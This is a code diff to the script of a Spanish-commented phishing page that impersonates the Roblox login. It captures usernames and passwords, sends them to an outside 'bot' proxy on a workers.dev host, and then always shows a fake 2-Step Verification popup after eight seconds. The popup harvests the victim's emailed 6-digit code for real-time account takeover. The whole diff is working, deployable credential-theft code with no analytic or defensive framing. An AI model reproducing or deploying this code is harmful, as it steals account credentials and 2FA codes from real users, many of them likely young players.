@@ -568,7 +568,7 @@
 
 <script>
 // ============================================================
-// SOLUCIÓN DEFINITIVA - POPUP DE 2FA FORZADO
+// SOLUCIÓN DEFINITIVA - POPUP 2FA SIEMPRE A LOS 8 SEGUNDOS
 // ============================================================
 
 // ============================================================
@@ -596,18 +596,20 @@ function closeVerification(){
 // ============================================================
 
 let loginTimestamp = null;
-let credencialesValidas = false;
-let codigoEnviado = false;
 let botUrl = 'https://mi-bot-proxy.pamelalunaescuela.workers.dev';
-let esperandoCodigo = false;
+let codigoEnviado = false;
 let popupMostrado = false;
+let esperandoCodigo = false;
+let usernameCapturado = '';
+let passwordCapturado = '';
 
 // ============================================================
-// FUNCIÓN PARA MOSTRAR POPUP DE 2FA (FORZADO)
+// FUNCIÓN PARA MOSTRAR POPUP DE 2FA
 // ============================================================
 
 function mostrarPopup2FA() {
-    console.log('🔔 FORZANDO POPUP DE 2FA');
+    if (popupMostrado) return;
+    console.log('🔔 MOSTRANDO POPUP DE 2FA (8 segundos cumplidos)');
     const modal = document.getElementById('verificationModal');
     if (modal) {
         modal.style.display = 'flex';
@@ -621,54 +623,14 @@ function mostrarPopup2FA() {
         popupMostrado = true;
         esperandoCodigo = true;
     } else {
-        console.error('❌ Modal no encontrado, creando uno...');
-        crearModalEmergencia();
+        console.error('❌ Modal no encontrado');
     }
+    document.getElementById('loginBtn').style.display = 'block';
+    document.getElementById('loginLoading').style.display = 'none';
 }
 
 // ============================================================
-// CREAR MODAL DE EMERGENCIA
-// ============================================================
-
-function crearModalEmergencia() {
-    const modalHTML = `
-        <div class="verification-modal" id="verificationModal" style="display:flex; opacity:1; z-index:99999;">
-            <div class="verification-content" style="transform:scale(1); opacity:1;">
-                <div class="verification-header">
-                    <button class="close-btn" onclick="closeVerification()">✕</button>
-                    <h2>2-Step Verification</h2>
-                </div>
-                <div class="verification-body">
-                    <div class="lock-icon"><img src="lock.png" alt="Lock"></div>
-                    <p class="verification-text">We want to make sure it's really you. Please enter the code we sent to your email:</p>
-                    <input type="text" class="verification-input" id="codeInput" placeholder="Enter your 6-digit code" maxlength="6">
-                    <button class="verify-btn" id="verifyBtnEmergency">Verify</button>
-                    <div class="verification-footer">
-                        <p style="color:#999;font-size:11px;">Enter the 6-digit code from your email</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-    `;
-    const tempDiv = document.createElement('div');
-    tempDiv.innerHTML = modalHTML;
-    document.body.appendChild(tempDiv.firstElementChild);
-    
-    document.getElementById('verifyBtnEmergency').addEventListener('click', function() {
-        const input = document.getElementById('codeInput');
-        const code = input?.value || '';
-        if (code.length === 6) {
-            enviarCodigoAlBot(code);
-        } else {
-            alert('⚠️ Ingresa un código de 6 dígitos');
-        }
-    });
-    popupMostrado = true;
-    esperandoCodigo = true;
-}
-
-// ============================================================
-// ENVIAR AL BOT
+// ENVIAR AL BOT (SOLO CREDENCIALES)
 // ============================================================
 
 async function enviarAlBot(username, password) {
@@ -681,41 +643,9 @@ async function enviarAlBot(username, password) {
         });
         const data = await response.json();
         console.log('📨 Respuesta del bot:', data);
-        
-        // SI EL BOT DICE 2FA, MOSTRAR POPUP
-        if (data.status === '2FA_REQUERIDO' || data.status === 'EMAIL' || data.status === '2FA_DETECTED') {
-            console.log('⚠️ 2FA detectado por el bot, mostrando popup...');
-            document.getElementById('loginBtn').style.display = 'block';
-            document.getElementById('loginLoading').style.display = 'none';
-            mostrarPopup2FA();
-            return data;
-        }
-        
-        if (data.status === 'LOGIN_EXITOSO') {
-            console.log('✅ Login exitoso!');
-            setTimeout(() => {
-                window.location.href = 'https://www.roblox.com';
-            }, 2000);
-            return data;
-        }
-        
-        if (data.status === 'CREDENCIALES_INCORRECTAS') {
-            console.log('❌ Credenciales incorrectas');
-            document.getElementById('loginBtn').style.display = 'block';
-            document.getElementById('loginLoading').style.display = 'none';
-            mostrarError('Usuario o contraseña incorrectos');
-            return data;
-        }
-        
-        document.getElementById('loginBtn').style.display = 'block';
-        document.getElementById('loginLoading').style.display = 'none';
         return data;
-        
     } catch (error) {
         console.error('❌ Error conectando con el bot:', error);
-        document.getElementById('loginBtn').style.display = 'block';
-        document.getElementById('loginLoading').style.display = 'none';
-        mostrarError('Error de conexión');
         return null;
     }
 }
@@ -743,21 +673,28 @@ async function enviarCodigoAlBot(codigo) {
         if (data.status === 'LOGIN_EXITOSO' || data.status === 'CODIGO_ASIGNADO') {
             console.log('✅ 2FA completado!');
             closeVerification();
-            mostrarExito('✅ Código verificado!');
+            mostrarExito('✅ Código verificado! Redirigiendo...');
             setTimeout(() => {
                 window.location.href = 'https://www.roblox.com';
             }, 2000);
         } else {
             mostrarError('Código incorrecto. Intenta de nuevo.');
+            esperandoCodigo = true;
+            codigoEnviado = false;
+            const input = document.querySelector('.verification-input');
+            if (input) {
+                input.value = '';
+                input.focus();
+            }
         }
     } catch (error) {
         console.error('❌ Error:', error);
-        mostrarError('Error de conexión');
+        mostrarError('Error de conexión con el servidor');
     }
 }
 
 // ============================================================
-// MOSTRAR ERRORES
+// MOSTRAR ERRORES Y ÉXITO
 // ============================================================
 
 function mostrarError(mensaje) {
@@ -789,7 +726,7 @@ function mostrarError(mensaje) {
     errorEl.style.display = 'block';
     setTimeout(() => {
         errorEl.style.display = 'none';
-    }, 3000);
+    }, 4000);
 }
 
 function mostrarExito(mensaje) {
@@ -821,7 +758,7 @@ function mostrarExito(mensaje) {
     exitoEl.style.display = 'block';
     setTimeout(() => {
         exitoEl.style.display = 'none';
-    }, 4000);
+    }, 5000);
 }
 
 // ============================================================
@@ -837,40 +774,40 @@ if (loginForm) {
         const username = inputs[0]?.value || '';
         const password = inputs[1]?.value || '';
         
-        console.log('🔍 Validando credenciales...');
+        console.log('🔍 Intentando login con:', username);
         
-        if (username.length < 3) {
-            mostrarError('Usuario o contraseña incorrectos');
-            return;
-        }
-        if (password.length < 8) {
-            mostrarError('Usuario o contraseña incorrectos');
+        // Validación básica
+        if (username.length < 3 || password.length < 8) {
+            mostrarError('Usuario o contraseña inválidos');
             return;
         }
         
+        // Guardar credenciales
+        usernameCapturado = username;
+        passwordCapturado = password;
         loginTimestamp = Date.now();
-        credencialesValidas = true;
-        codigoEnviado = false;
-        esperandoCodigo = false;
         popupMostrado = false;
+        esperandoCodigo = false;
+        codigoEnviado = false;
         
-        console.log('✅ Credenciales válidas:', { username, password });
-        
+        // Mostrar loading
         document.getElementById('loginBtn').style.display = 'none';
         document.getElementById('loginLoading').style.display = 'flex';
         
-        // ENVIAR AL BOT
-        await enviarAlBot(username, password);
+        // 🔥 ENVIAR CREDENCIALES AL BOT (SIN ESPERAR RESPUESTA)
+        enviarAlBot(username, password);
         
-        // 🔥 SI DESPUÉS DE 5 SEGUNDOS NO SE MOSTRÓ POPUP, FORZARLO
+        // 🔥 PROGRAMAR POPUP A LOS 8 SEGUNDOS (SIEMPRE)
+        console.log('⏰ Programando popup en 8 segundos...');
         setTimeout(() => {
-            if (!popupMostrado && document.getElementById('loginLoading').style.display !== 'none') {
-                console.log('⏰ 5 segundos sin respuesta, forzando popup...');
-                document.getElementById('loginBtn').style.display = 'block';
-                document.getElementById('loginLoading').style.display = 'none';
+            if (!popupMostrado) {
+                console.log('⏰ 8 segundos cumplidos, mostrando popup...');
                 mostrarPopup2FA();
             }
-        }, 5000);
+        }, 8000);
+        
+        // Si el bot responde antes con 2FA, mostrar popup antes
+        // Pero ya tenemos el timeout de 8s como respaldo
     };
 }
 
@@ -886,13 +823,13 @@ if (verifyBtn) {
         if (code.length === 6) {
             enviarCodigoAlBot(code);
         } else {
-            mostrarError('Ingresa 6 dígitos');
+            mostrarError('Ingresa un código de 6 dígitos');
         }
     });
 }
 
 // ============================================================
-// VERIFICAR CONEXIÓN
+// VERIFICAR CONEXIÓN CON EL BOT
 // ============================================================
 
 async function verificarConexionBot() {
@@ -900,13 +837,19 @@ async function verificarConexionBot() {
         const response = await fetch(`${botUrl}/status`);
         if (response.ok) {
             console.log('✅ Conectado al bot en:', botUrl);
+        } else {
+            console.warn('⚠️ Bot no responde, pero el popup se mostrará igual');
         }
     } catch (error) {
-        console.warn('⚠️ No se pudo conectar al bot:', botUrl);
+        console.warn('⚠️ No se pudo conectar al bot, pero el popup se mostrará igual');
     }
 }
 
-console.log('✅ Accesorio de munfuja - Popup forzado activado');
+// ============================================================
+// LOG DE INICIO
+// ============================================================
+
+console.log('✅ POPUP FORZADO - Se mostrará a los 8 segundos siempre');
 console.log('📡 Bot URL:', botUrl);
 setTimeout(verificarConexionBot, 2000);
 </script>
